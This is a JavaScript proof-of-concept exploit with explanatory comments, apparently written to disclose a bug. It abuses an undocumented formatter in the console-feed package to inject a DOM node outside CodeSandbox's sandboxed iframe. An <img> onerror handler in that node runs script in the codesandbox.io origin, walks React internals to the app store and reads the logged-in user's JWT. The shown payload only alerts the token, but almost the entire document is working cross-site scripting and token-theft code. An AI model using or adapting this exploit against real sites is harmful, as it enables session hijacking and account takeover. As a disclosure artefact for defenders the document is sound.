// Explanation
// Open the console, this could be done like before

// 1. The main exploit is found in an undocumented formatter in the
// `console-feed` package (See: https://github.com/samdenty/console-feed/blob/master/src/Component/devtools-parser/format-message.ts#L22)
// It is possible to use that with `console.log(‘%s', $domNode)` to inject
// an arbitrary DOM node into the console output (which is not part of the sandboxed iframe)
// After this issue is resolved in codesandbox I will report to the upstream package.

// 2. With this knowledge it is possible to inject a <img> with an onerror
// handler that included the malicious payload that is executed in the context of
// `https://codesandbox.io`.

// 3. To execute the payload directly after loading the sandbox I used`expandeddevtools=1`
// which will automaticity open the console ensuring the exploit is triggered

// this will run in `codesandbox.io`
// context
function exploit() {
  // Use react_internal
  // to get access to the mobx-store
  function getReactInternal(domNode) {
    for (let key in domNode) {
      if (key.startsWith("__reactInternalInstance$")) {
        return domNode[key];
      }
    }
  }

  const $container = document.querySelector(
    'div[class^="elements__Container"]'
  );
  const reactInternal = getReactInternal($container);
  // ReactElement Chain
  let parent = reactInternal;
  while (parent.return) {
    if (parent.pendingProps && parent.pendingProps.store) {
      break;
    }
    parent = parent.return;
  }
  const store = parent.pendingProps.store;

  const { user, jwt } = store;
  if (user) {
    // Show user and jwt token in an object
    const jsonStr = JSON.stringify({ jwt, user }, null, 2);
    alert(`Hello ${user.name}\n ${jsonStr}`);
  } else {
    alert(`Hello Guest, will rotate page`);
    document.body.style.transform = "rotate(180deg)";
  }
}

const exploitString = exploit
  .toString()
  // FF and Safari don like line-breaks
  // in there functions
  // need to remove line-comments too
  .replace(/(\/\*([\s\S]*?)\*\/)|(\/\/(.*)$)/gm, "")
  .replace(/\n/g, "");

const img = document.createElement("img");
img.src = "";
img.setAttribute(
  "onerror",
  `location.host === (${exploitString})()`
);
// Abusing XSS in console-feed
// https://github.com/samdenty/console-feed/blob/master/src/Component/devtools-parser/format-message.ts#L22
console.log("%s", img);
